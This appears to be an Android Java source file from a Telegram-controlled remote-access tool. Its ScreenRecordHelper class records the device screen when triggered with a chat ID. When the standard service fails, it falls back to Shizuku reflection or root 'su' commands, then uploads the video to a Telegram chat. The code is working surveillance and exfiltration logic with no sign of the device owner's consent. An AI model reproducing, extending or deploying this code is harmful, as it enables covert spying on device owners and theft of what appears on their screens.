package com.java.panel;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import java.io.File;
import java.lang.reflect.Method;

public class ScreenRecordHelper {

    private static Process activeProcess = null;
    private static String currentFilePath = null;

    public static String startRecording(Context context, int durationSeconds, String chatId) {
        try {
            Intent intent = new Intent(context, ScreenRecordService.class);
            intent.putExtra("duration", durationSeconds);
            intent.putExtra("chatId", chatId);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent);
            } else {
                context.startService(intent);
            }
            return "🎬 Starting screen recording via standard service (" + durationSeconds + " seconds)...";
        } catch (Exception e1) {
            return startRecordingWithPrivileges(context, durationSeconds, chatId);
        }
    }

    private static String startRecordingWithPrivileges(Context context, int durationSeconds, String chatId) {
        new Thread(() -> {
            try {
                File dir = new File(Environment.getExternalStorageDirectory(), "/panel");
                if (!dir.exists()) dir.mkdirs();

                currentFilePath = dir.getAbsolutePath() + "/screen_rec_" + System.currentTimeMillis() + ".mp4";
                int timeLimit = Math.min(Math.max(durationSeconds, 1), 180);
                String command = "screenrecord --time-limit " + timeLimit + " " + currentFilePath;

                boolean success = false;

                try {
                    Class<?> shizukuClass = Class.forName("rikka.shizuku.Shizuku");
                    Method newProcessMethod = shizukuClass.getDeclaredMethod("newProcess", String[].class, String[].class, String.class);
                    newProcessMethod.setAccessible(true);
                    activeProcess = (Process) newProcessMethod.invoke(null, new String[]{"sh", "-c", command}, null, null);
                    if (activeProcess != null) {
                        if (ShellService.instance != null) {
                            ShellService.instance.sendTelegramMessage(chatId, "🎬 Screen recording started via Shizuku (" + timeLimit + "s)...");
                        }
                        activeProcess.waitFor();
                        success = true;
                    }
                } catch (Exception ignored) {}

                if (!success) {
                    try {
                        activeProcess = Runtime.getRuntime().exec(new String[]{"su", "-c", command});
                        if (activeProcess != null) {
                            if (ShellService.instance != null) {
                                ShellService.instance.sendTelegramMessage(chatId, "🎬 Screen recording started via Root (" + timeLimit + "s)...");
                            }
                            activeProcess.waitFor();
                            success = true;
                        }
                    } catch (Exception ignored) {}
                }

                activeProcess = null;

                File file = new File(currentFilePath);
                if (success && file.exists() && file.length() > 0) {
                    if (ShellService.instance != null) {
                        ShellService.instance.sendTelegramMessage(chatId, "✅ Screen recording completed:\n" + currentFilePath);
                        ShellService.instance.sendFileToTelegram(currentFilePath, chatId);
                    }
                } else {
                    if (ShellService.instance != null) {
                        ShellService.instance.sendTelegramMessage(chatId, "❌ Screen recording could not be started (Standard service, Shizuku, or Root privilege may be required).");
                    }
                }

            } catch (Exception e) {
                activeProcess = null;
                if (ShellService.instance != null) {
                    ShellService.instance.sendTelegramMessage(chatId, "❌ Screen recording error: " + e.getMessage());
                }
            }
        }).start();

        return "🎬 Screen recording triggered via fallback privileged method...";
    }

    public static String stopRecording(Context context, String chatId) {
        try {
            Intent intent = new Intent(context, ScreenRecordService.class);
            intent.putExtra("stop", true);
            context.startService(intent);

            if (activeProcess != null) {
                activeProcess.destroy();
                activeProcess = null;
            } else {
                try {
                    Runtime.getRuntime().exec(new String[]{"su", "-c", "killall screenrecord"});
                } catch (Exception ignored) {}
            }
            return "🛑 Screen recording stop signal sent.";
        } catch (Exception e) {
            return "❌ Could not stop screen recording: " + e.getMessage();
        }
    }
}
